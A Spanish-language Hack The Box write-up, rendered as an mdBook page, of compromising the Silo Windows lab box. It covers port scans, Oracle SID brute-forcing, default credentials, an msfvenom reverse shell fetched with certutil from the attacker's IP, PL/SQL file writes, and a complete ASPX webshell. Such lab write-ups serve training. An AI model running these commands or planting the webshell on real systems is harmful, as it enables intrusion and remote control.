@@ -1,0 +1,431 @@
+<!DOCTYPE HTML>
+<html lang="es" class="sidebar-visible no-js ayu">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>Silo - Secronomicón</title>
+        <!-- Custom HTML head -->
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <meta name="description" content="Libro de notas donde encontrarás cada truco/técnica/guía de hacking que he aprendido y recolectado de CTFS, aplicaciones reales, lectura de writeups y noticias.">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff" />
+
+        <link rel="icon" href="../../../../../favicon.svg">
+        <link rel="shortcut icon" href="../../../../../favicon.png">
+        <link rel="stylesheet" href="../../../../../css/variables.css">
+        <link rel="stylesheet" href="../../../../../css/general.css">
+        <link rel="stylesheet" href="../../../../../css/chrome.css">
+        <link rel="stylesheet" href="../../../../../css/print.css" media="print">
+        <!-- Fonts -->
+        <link rel="stylesheet" href="../../../../../FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="../../../../../fonts/fonts.css">
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="../../../../../highlight.css">
+        <link rel="stylesheet" href="../../../../../tomorrow-night.css">
+        <link rel="stylesheet" href="../../../../../ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+    </head>
+    <body>
+        <!-- Provide site root to javascript -->
+        <script type="text/javascript">
+            var path_to_root = "../../../../../";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "ayu" : "ayu";
+        </script>
+
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script type="text/javascript">
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script type="text/javascript">
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            var html = document.querySelector('html');
+            html.classList.remove('no-js')
+            html.classList.remove('ayu')
+            html.classList.add(theme);
+            html.classList.add('js');
+        </script>
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script type="text/javascript">
+            var html = document.querySelector('html');
+            var sidebar = 'hidden';
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            }
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <div class="sidebar-scrollbox">
+                <ol class="chapter"><li class="chapter-item expanded affix "><a href="../../../../../index.html">Secronomicón</a></li><li class="chapter-item expanded affix "><li class="part-title">Guías / Cursos</li><li class="chapter-item expanded "><a href="../../../../../guides/oscp_bof/index.html"><strong aria-hidden="true">1.</strong> OSCP Buffer Overflow</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.</strong> Port Swigger Academy</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../../guides/port_swigger_academy/sql_injection.html"><strong aria-hidden="true">2.1.</strong> SQL Injection</a></li></ol></li><li class="chapter-item expanded "><a href="../../../../../guides/pwncollege/index.html"><strong aria-hidden="true">3.</strong> PwnCollege</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../../guides/pwncollege/0_module/index.html"><strong aria-hidden="true">3.1.</strong> Módulo 0</a></li></ol></li><li class="chapter-item expanded "><a href="../../../../../guides/active_directory/index.html"><strong aria-hidden="true">4.</strong> Active Directory</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../../guides/active_directory/0_general.html"><strong aria-hidden="true">4.1.</strong> Teoría General</a></li><li class="chapter-item expanded "><a href="../../../../../guides/active_directory/1_attacking.html"><strong aria-hidden="true">4.2.</strong> Atacando Active Directory</a></li></ol></li><li class="chapter-item expanded "><a href="../../../../../guides/ecpptv2_lab/index.html"><strong aria-hidden="true">5.</strong> eCPPTv2 s4viLab</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../../guides/ecpptv2_lab/1_aragog/index.html"><strong aria-hidden="true">5.1.</strong> Aragog</a></li><li class="chapter-item expanded "><a href="../../../../../guides/ecpptv2_lab/2_nagini/index.html"><strong aria-hidden="true">5.2.</strong> Nagini</a></li><li class="chapter-item expanded "><a href="../../../../../guides/ecpptv2_lab/3_fawkes/index.html"><strong aria-hidden="true">5.3.</strong> Fawkes</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">5.4.</strong> Matrix 1</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">5.5.</strong> Brainpan</div></li></ol></li><li class="chapter-item expanded "><a href="../../../../../guides/nightmare/index.html"><strong aria-hidden="true">6.</strong> Nightmare</a></li><li class="chapter-item expanded affix "><li class="part-title">Misc</li><li class="chapter-item expanded "><a href="../../../../../templates/index.html"><strong aria-hidden="true">7.</strong> Templates</a></li><li class="chapter-item expanded affix "><li class="part-title">Cheat Sheets</li><li class="chapter-item expanded "><a href="../../../../../cheat_sheets/general.html"><strong aria-hidden="true">8.</strong> General</a></li><li class="chapter-item expanded "><a href="../../../../../cheat_sheets/active_directory.html"><strong aria-hidden="true">9.</strong> Active Directory</a></li><li class="chapter-item expanded "><a href="../../../../../cheat_sheets/network/general.html"><strong aria-hidden="true">10.</strong> Network</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../../cheat_sheets/network/pivoting.html"><strong aria-hidden="true">10.1.</strong> Pivoting</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">11.</strong> Pwning</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../../cheat_sheets/pwning/linux.html"><strong aria-hidden="true">11.1.</strong> Linux pwning</a></li><li class="chapter-item expanded "><a href="../../../../../cheat_sheets/pwning/bof-oscp.html"><strong aria-hidden="true">11.2.</strong> OSCP Buffer Overflow</a></li></ol></li><li class="chapter-item expanded "><a href="../../../../../cheat_sheets/fuzzing.html"><strong aria-hidden="true">12.</strong> Fuzzing</a></li><li class="chapter-item expanded "><a href="../../../../../cheat_sheets/inyecciones.html"><strong aria-hidden="true">13.</strong> Inyecciones</a></li><li class="chapter-item expanded "><a href="../../../../../cheat_sheets/transfer.html"><strong aria-hidden="true">14.</strong> Transferencia de archivos</a></li><li class="chapter-item expanded affix "><li class="part-title">CTFs</li><li class="chapter-item expanded "><a href="../../../../../ctfs/20220922_ctf-core2022/index.html"><strong aria-hidden="true">15.</strong> 22/09/2022 - IPN Core 2022 CTF</a></li><li class="chapter-item expanded affix "><li class="part-title">Hack The Box</li><li class="chapter-item expanded "><div><strong aria-hidden="true">16.</strong> Battlegrounds</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../../htb/battlegrounds/mayhem/index.html"><strong aria-hidden="true">16.1.</strong> Cyber Mayhem</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">17.</strong> Challenges</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.</strong> Boxes</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">18.1.</strong> Linux</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">18.1.1.</strong> Fácil</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.1.2.</strong> Medio</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.1.3.</strong> Difícil</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.1.4.</strong> Locura</div></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.2.</strong> Windows</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">18.2.1.</strong> Fácil</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../../htb/boxes/windows/1_facil/Active/index.html"><strong aria-hidden="true">18.2.1.1.</strong> Active</a></li><li class="chapter-item expanded "><a href="../../../../../htb/boxes/windows/1_facil/Devel/index.html"><strong aria-hidden="true">18.2.1.2.</strong> Devel</a></li><li class="chapter-item expanded "><a href="../../../../../htb/boxes/windows/1_facil/Remote/index.html"><strong aria-hidden="true">18.2.1.3.</strong> Remote</a></li><li class="chapter-item expanded "><a href="../../../../../htb/boxes/windows/1_facil/Access/index.html"><strong aria-hidden="true">18.2.1.4.</strong> Access</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.2.2.</strong> Medio</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../../htb/boxes/windows/2_medio/Chatterbox/index.html"><strong aria-hidden="true">18.2.2.1.</strong> Chatterbox</a></li><li class="chapter-item expanded "><a href="../../../../../htb/boxes/windows/2_medio/Jeeves/index.html"><strong aria-hidden="true">18.2.2.2.</strong> Jeeves</a></li><li class="chapter-item expanded "><a href="../../../../../htb/boxes/windows/2_medio/SecNotes/index.html"><strong aria-hidden="true">18.2.2.3.</strong> SecNotes</a></li><li class="chapter-item expanded "><a href="../../../../../htb/boxes/windows/2_medio/Silo/index.html" class="active"><strong aria-hidden="true">18.2.2.4.</strong> Silo</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.2.3.</strong> Difícil</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../../htb/boxes/windows/3_dificil/Control/index.html"><strong aria-hidden="true">18.2.3.1.</strong> Control</a></li><li class="chapter-item expanded "><a href="../../../../../htb/boxes/windows/3_dificil/Search/index.html"><strong aria-hidden="true">18.2.3.2.</strong> Search</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.2.4.</strong> Locura</div></li></ol></li></ol></li><li class="chapter-item expanded "><li class="part-title">echoCTF</li><li class="chapter-item expanded "><div><strong aria-hidden="true">19.</strong> Challenges</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">20.</strong> Networks</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">21.</strong> Targets</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">21.1.</strong> Principiante</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">21.2.</strong> Básico</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../../echoCTF/targets/2_basic/Flanders/index.html"><strong aria-hidden="true">21.2.1.</strong> Flanders</a></li><li class="chapter-item expanded "><a href="../../../../../echoCTF/targets/2_basic/Smithers/index.html"><strong aria-hidden="true">21.2.2.</strong> Smithers</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">21.3.</strong> Intermedio</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">21.4.</strong> Avanzado</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">21.5.</strong> Experto</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../../echoCTF/targets/5_expert/gogo-yubari/index.html"><strong aria-hidden="true">21.5.1.</strong> Gogo Yubari</a></li><li class="chapter-item expanded "><a href="../../../../../echoCTF/targets/5_expert/hajmetr/index.html"><strong aria-hidden="true">21.5.2.</strong> Hajmetr</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">21.6.</strong> Guru</div></li></ol></li></ol>
+            </div>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky bordered">
+                    <div class="left-buttons">
+                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </button>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu (default)</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title">Secronomicón</h1>
+
+                    <div class="right-buttons">
+                        <a href="../../../../../print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script type="text/javascript">
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1 id="estadísticas"><a class="header" href="#estadísticas">Estadísticas</a></h1>
+<div class="table-wrapper"><table><thead><tr><th>Característica</th><th>Descripción</th></tr></thead><tbody>
+<tr><td>Nombre</td><td><a href="https://www.hackthebox.com/home/machines/profile/131">Silo</a></td></tr>
+<tr><td>OS</td><td>Windows</td></tr>
+<tr><td>Dificultad oficial</td><td>Medium</td></tr>
+<tr><td>Dificultad de comunidad</td><td><img src="images/difficulty.png" alt="Dificultad" /></td></tr>
+<tr><td>Puntos</td><td>30</td></tr>
+<tr><td>Creadores</td><td><a href="https://www.hackthebox.com/home/users/profile/1190">egre55</a></td></tr>
+</tbody></table>
+</div>
+<h1 id="reconocimiento"><a class="header" href="#reconocimiento">Reconocimiento</a></h1>
+<h2 id="escaneo-de-host"><a class="header" href="#escaneo-de-host">Escaneo de host</a></h2>
+<h3 id="escaneo-completo-de-puertos"><a class="header" href="#escaneo-completo-de-puertos">Escaneo completo de puertos</a></h3>
+<pre><code class="language-bash">└─$ sudo nmap -sS --min-rate 5000 -vvv -open -p- -n -Pn -oG nmap/all_ports_ss $TARGET
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-23 23:09 EDT
+Initiating SYN Stealth Scan at 23:09
+Scanning 10.10.10.82 [65535 ports]
+Discovered open port 80/tcp on 10.10.10.82
+Discovered open port 445/tcp on 10.10.10.82
+Discovered open port 139/tcp on 10.10.10.82
+Discovered open port 135/tcp on 10.10.10.82
+Discovered open port 49161/tcp on 10.10.10.82
+Discovered open port 49155/tcp on 10.10.10.82
+Discovered open port 49162/tcp on 10.10.10.82
+Discovered open port 49154/tcp on 10.10.10.82
+Discovered open port 49160/tcp on 10.10.10.82
+Discovered open port 47001/tcp on 10.10.10.82
+Discovered open port 49153/tcp on 10.10.10.82
+Discovered open port 49159/tcp on 10.10.10.82
+Discovered open port 49152/tcp on 10.10.10.82
+Discovered open port 5985/tcp on 10.10.10.82
+Discovered open port 1521/tcp on 10.10.10.82
+Completed SYN Stealth Scan at 23:09, 13.20s elapsed (65535 total ports)
+Nmap scan report for 10.10.10.82
+Host is up, received user-set (0.064s latency).
+Scanned at 2022-05-23 23:09:27 EDT for 14s
+Not shown: 65520 closed tcp ports (reset)
+PORT      STATE SERVICE      REASON
+80/tcp    open  http         syn-ack ttl 127
+135/tcp   open  msrpc        syn-ack ttl 127
+139/tcp   open  netbios-ssn  syn-ack ttl 127
+445/tcp   open  microsoft-ds syn-ack ttl 127
+1521/tcp  open  oracle       syn-ack ttl 127
+5985/tcp  open  wsman        syn-ack ttl 127
+47001/tcp open  winrm        syn-ack ttl 127
+49152/tcp open  unknown      syn-ack ttl 127
+49153/tcp open  unknown      syn-ack ttl 127
+49154/tcp open  unknown      syn-ack ttl 127
+49155/tcp open  unknown      syn-ack ttl 127
+49159/tcp open  unknown      syn-ack ttl 127
+49160/tcp open  unknown      syn-ack ttl 127
+49161/tcp open  unknown      syn-ack ttl 127
+49162/tcp open  unknown      syn-ack ttl 127
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 13.27 seconds
+           Raw packets sent: 65634 (2.888MB) | Rcvd: 65535 (2.621MB)
+</code></pre>
+<h3 id="escaneo-específico"><a class="header" href="#escaneo-específico">Escaneo específico</a></h3>
+<pre><code class="language-bash">└─$ nmap -sCV -p 80,135,139,445,1521,5985,47001,49152,49153,49154,49155,49159,49160,49161,49162 -n -Pn -oN nmap/targeted $TARGET
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-23 23:11 EDT
+Nmap scan report for 10.10.10.82
+Host is up (0.065s latency).
+
+PORT      STATE SERVICE      VERSION
+80/tcp    open  http         Microsoft IIS httpd 8.5
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-title: IIS Windows Server
+|_http-server-header: Microsoft-IIS/8.5
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
+1521/tcp  open  oracle-tns   Oracle TNS listener 11.2.0.2.0 (unauthorized)
+5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+49152/tcp open  msrpc        Microsoft Windows RPC
+49153/tcp open  msrpc        Microsoft Windows RPC
+49154/tcp open  msrpc        Microsoft Windows RPC
+49155/tcp open  msrpc        Microsoft Windows RPC
+49159/tcp open  oracle-tns   Oracle TNS listener (requires service name)
+49160/tcp open  msrpc        Microsoft Windows RPC
+49161/tcp open  msrpc        Microsoft Windows RPC
+49162/tcp open  msrpc        Microsoft Windows RPC
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode:
+|   3.0.2:
+|_    Message signing enabled but not required
+| smb2-time:
+|   date: 2022-05-24T03:13:17
+|_  start_date: 2022-05-24T02:53:36
+| smb-security-mode:
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: supported
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 127.10 seconds
+</code></pre>
+<h1 id="enumeración"><a class="header" href="#enumeración">Enumeración</a></h1>
+<h2 id="servicios"><a class="header" href="#servicios">Servicios</a></h2>
+<h3 id="microsoft-iis---80"><a class="header" href="#microsoft-iis---80">Microsoft IIS - 80</a></h3>
+<p>Se expone la página por default de Microsoft IIS y al hacer uso de herramientas de fuzzing no se tuvo éxito al buscar algún directorio relevante, sin embargo, para el método intencionado de resolución es importante tener a consideración.</p>
+<p><img src="images/enum_1.png" alt="Página default IIS" /></p>
+<h3 id="oracle-tns-listener---1521"><a class="header" href="#oracle-tns-listener---1521">Oracle TNS Listener - 1521</a></h3>
+<p>Después de revisar acerca de la <a href="https://book.hacktricks.xyz/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener">metodología empleada</a> para este servicio, se buscó obtener información relevante respecto la versión, estatus, etc, haciendo uso de <code>tnscmd10g</code> sin éxito alguno.</p>
+<p>Posteriormente, en la metodología se mencionan los SID (Identificadores de Servicio, esencialmente pueden ser reconocidos como los nombres de las bases de datos), los cuales dependiendo de la instalación realizada pueden existir uno o más SIDs por defecto. Al no poder obtenerlos mediante <code>tnscmd10g</code>, se sugiere que realice fuerza bruta de los comúnes para identificar los existentes.</p>
+<h4 id="hydra"><a class="header" href="#hydra">hydra</a></h4>
+<p>Haciendo uso de:</p>
+<pre><code class="language-bash">hydra -L content/sids-oracle.txt -s 1521 10.10.10.82 oracle-sid
+</code></pre>
+<p>Con el conjunto de diccionarios que ofrece <a href="https://book.hacktricks.xyz/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener#what-is-a-sid">hacktricks</a> (el cual es un compendio de las listas de nmap y metasploit), se identificaron los SIDs:</p>
+<ul>
+<li>CLRExtProc.</li>
+<li>PLSExtProc.</li>
+<li>XE.</li>
+</ul>
+<p><img src="images/enum_2.png" alt="Fuerza bruta de SIDs" /></p>
+<h1 id="explotación"><a class="header" href="#explotación">Explotación</a></h1>
+<p><em>Nota: Después de resolver la máquina se suele verificar el proceso con otras fuentes, identificando de esta manera que existen 2 caminos a resolver la máquina una intencionada y una no intencionada, una más directa por no decir fácil que la otra. Primero se expondrá el método por el cuál se resolvió inicialmente y posteriormente la resolución intencionada.</em></p>
+<h2 id="no-intencionada"><a class="header" href="#no-intencionada">No intencionada</a></h2>
+<h3 id="obtención-de-credenciales"><a class="header" href="#obtención-de-credenciales">Obtención de credenciales</a></h3>
+<h4 id="pasos-previos--preparación"><a class="header" href="#pasos-previos--preparación">Pasos previos | Preparación</a></h4>
+<p>Haciendo uso de <a href="https://github.com/quentinhardy/odat">ODAT</a> se obtuvieron credenciales de un usuario disponible, por medio de un módulo que la herramienta ofrece. Inicialmente se requiere la instalación descrita en el repositorio aunque por lo que respecta en kali, basta con clonar el repositorio.</p>
+<h4 id="ejecución"><a class="header" href="#ejecución">Ejecución</a></h4>
+<p>Como parte inicial se ejecutó un &quot;Ave María&quot; invocando todos los módulos que la herramienta ofrece para visualizar si de esta manera se identificaba algo que pudiera servir, para ello, la herramienta solicita un SID válido a ocupar, siendo <code>XE</code> el SID con información útil (identificándolo después de ejecutar el comando con cada uno de los SIDs). Haciendo uso de:</p>
+<pre><code class="language-bash">./odat.py all -s 10.10.10.82 -p 1521 -d XE
+</code></pre>
+<p><img src="images/exploit_1.png" alt="Obtención de credenciales" /></p>
+<p>Posteriormente se identificó que el módulo encargado de hacer este proceso es <code>passwordguesser</code> el cual simplemente sustituiría a <code>all</code> del comando.</p>
+<h3 id="rce"><a class="header" href="#rce">RCE</a></h3>
+<h4 id="pasos-previos--preparación-1"><a class="header" href="#pasos-previos--preparación-1">Pasos previos | Preparación</a></h4>
+<p>Posteriormente, al revisar los módulos disponibles se identificó que tanto el módulo <code>dbmsscheduler</code> como el módulo <code>externaltable</code> ofrecen capacidad de ejecutar comandos. Que al intentar usarlos no se permitió su ejecución debido a la falta de privilegios, sin embargo, se encontró que mediante la bandera <code>--sysdba</code> existe la posibilidad de &quot;escalar&quot; estos privilegios o impersonar un rol superior al que se tenía.</p>
+<h4 id="ejecución-1"><a class="header" href="#ejecución-1">Ejecución</a></h4>
+<p>Obteniendo así, una vez ejecutada la reverse shell, acceso directamente como administrador.</p>
+<ol>
+<li>
+<p>Creando un payload con:</p>
+<pre><code class="language-bash">msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.16 LPORT=1234 -f exe &gt; pwn.exe
+</code></pre>
+</li>
+<li>
+<p>Descargándolo con:</p>
+<pre><code class="language-bash">./odat.py dbmsscheduler -s 10.10.10.82 -p 1521 -U scott -P tiger -d XE --exec &quot;certutil.exe -f -urlcache -split http://10.10.14.16/pwn.exe c:\windows\temp\pwn.exe&quot; --sysdba
+</code></pre>
+</li>
+<li>
+<p>Y ejecutándolo con:</p>
+<pre><code class="language-bash">./odat.py externaltable -s 10.10.10.82 -p 1521 -U scott -P tiger -d XE --exec &quot;c:\windows\temp&quot; &quot;pwn.exe&quot; --sysdba
+</code></pre>
+</li>
+</ol>
+<p><img src="images/exploit_2.png" alt="Reverse shell" /></p>
+<h2 id="intencionada"><a class="header" href="#intencionada">Intencionada</a></h2>
+<p>Si bien odat permite la lectura, escritura y ejecución de archivos, todo lo que realiza en estos procesos no resulta tan &quot;transparente&quot; por lo que para entender un poco acerca de Oracle se realizo parte del mismo proceso por medio de SQL directamente.</p>
+<p><em>Nota: Se da por hecho que se realizo el descubrimiento de los SIDs y de las credenciales válidas, dado que <code>scott:tiger</code> son credenciales por default.</em></p>
+<h3 id="rce-1"><a class="header" href="#rce-1">RCE</a></h3>
+<h4 id="pasos-previos--preparación-2"><a class="header" href="#pasos-previos--preparación-2">Pasos previos | Preparación</a></h4>
+<p>Como parte de la <a href="https://github.com/quentinhardy/odat#installation-optional-for-development-version">instalación de odat</a>, se realiza la instalación del cliente sql para conectarse a la base de datos de Oracle.</p>
+<p>Por lo que una vez instalado se permite la conexión al host por medio de:</p>
+<pre><code class="language-bash">sqlplus64 scott/tiger@10.10.10.82:1521/XE as sysdba
+</code></pre>
+<p><img src="images/exploit_3.png" alt="Conexión con cliente Oracle" /></p>
+<h4 id="ejecución-2"><a class="header" href="#ejecución-2">Ejecución</a></h4>
+<p>Oracle ocupa su propia sintaxis por lo que con el siguiente pedazo de código se buscó obtener el contenido del archivo por defecto del servidor. Buscando obtener respuesta por medio del prompt configurando primeramente <code>set serveroutput ON</code> para su visualización.</p>
+<pre><code class="language-sql">declare
+    f utl_file.file_type;
+    s varchar(200);
+begin
+    f := utl_file.fopen('/inetpub/wwwroot', 'iisstart.htm', 'R');
+    utl_file.get_line(f,s);
+    utl_file.fclose(f);
+    dbms_output.put_line(s);
+end;
+</code></pre>
+<p><img src="images/exploit_4.png" alt="Lectura de archivos" /></p>
+<p>Por otra parte se puede verificar que también exista la capacidad de escribir a un archivo, verificándolo con el siguiente segmento de código.</p>
+<pre><code class="language-sql">declare
+    f utl_file.file_type;
+    s varchar(5000) := 'Hello world';
+begin
+    f := utl_file.fopen('/inetpub/wwwroot', 'srrequiem.txt', 'W');
+    utl_file.put_line(f,s);
+    utl_file.fclose(f);
+end;
+</code></pre>
+<p><img src="images/exploit_5.png" alt="Escritura de archivos" /></p>
+<p><img src="images/exploit_6.png" alt="Visualización en IIS" /></p>
+<p>Una vez validada la escritura, se abre la puerta a la creación de una reverse shell, el inconveniente es que debido al espacio limitado en las variables respecto a los caracteres no fue posible llevarlo a cabo, por lo que se optó por una webshell en su lugar.</p>
+<p>Utilizando <code>/usr/share/webshells/aspx/cmdasp.aspx</code> eliminando estilos, comentarios y saltos de línea para reducir los caracteres se obtuvo ejecución en la máquina.</p>
+<p>Código de página empleado:</p>
+<pre><code class="language-c#">&lt;%@ Page Language=&quot;C#&quot; Debug=&quot;true&quot; Trace=&quot;false&quot; %&gt;&lt;%@ Import Namespace=&quot;System.Diagnostics&quot; %&gt;&lt;%@ Import Namespace=&quot;System.IO&quot; %&gt;&lt;script Language=&quot;c#&quot; runat=&quot;server&quot;&gt;void Page_Load(object sender, EventArgs e){}string ExcuteCmd(string arg){ProcessStartInfo psi = new ProcessStartInfo();psi.FileName = &quot;cmd.exe&quot;;psi.Arguments = &quot;/c &quot;+arg;psi.RedirectStandardOutput = true;psi.UseShellExecute = false;Process p = Process.Start(psi);StreamReader stmrdr = p.StandardOutput;string s = stmrdr.ReadToEnd();stmrdr.Close();return s;}void cmdExe_Click(object sender, System.EventArgs e){Response.Write(&quot;&lt;pre&gt;&quot;);Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));Response.Write(&quot;&lt;/pre&gt;&quot;);}&lt;/script&gt;&lt;HTML&gt;&lt;body &gt;&lt;form id=&quot;cmd&quot; method=&quot;post&quot; runat=&quot;server&quot;&gt;&lt;asp:TextBox id=&quot;txtArg&quot; runat=&quot;server&quot; Width=&quot;250px&quot;&gt;&lt;/asp:TextBox&gt;&lt;asp:Button id=&quot;testing&quot; runat=&quot;server&quot; Text=&quot;excute&quot; OnClick=&quot;cmdExe_Click&quot;&gt;&lt;/asp:Button&gt;&lt;asp:Label id=&quot;lblText&quot; runat=&quot;server&quot;&gt;Command:&lt;/asp:Label&gt;&lt;/form&gt;&lt;/body&gt;&lt;/HTML&gt;
+</code></pre>
+<p><img src="images/exploit_7.png" alt="Webshell en aspx" /></p>
+<h1 id="post-explotación"><a class="header" href="#post-explotación">Post Explotación</a></h1>
+<h2 id="enumeración-1"><a class="header" href="#enumeración-1">Enumeración</a></h2>
+<p>Se identificó que entre los privilegios disponibles del usuario obtenido se encuentra habilitado <code>SeImpersonatePrivilege</code> lo que lleva a un camino de escalación de privilegios por medio de Rotten o JuicyPotato.</p>
+<p><img src="images/post_1.png" alt="Privilegios de usuario" /></p>
+<p>Se identificó un archivo accesible en el escritorio de uno de los usuarios del sistema <code>c:\users\phineas\desktop\oracle issue.txt</code> el cual indica que se trata de un dumpeo de memoria del sistema.</p>
+<p>Contenido:</p>
+<pre><code class="language-txt">Support vendor engaged to troubleshoot Windows / Oracle performance issue (full memory dump requested):
+
+Dropbox link provided to vendor (and password under separate cover).
+
+Dropbox link 
+https://www.dropbox.com/sh/69skryzfszb7elq/AADZnQEbbqDoIf5L2d0PBxENa?dl=0
+
+link password:
+£%Hm8646uC$
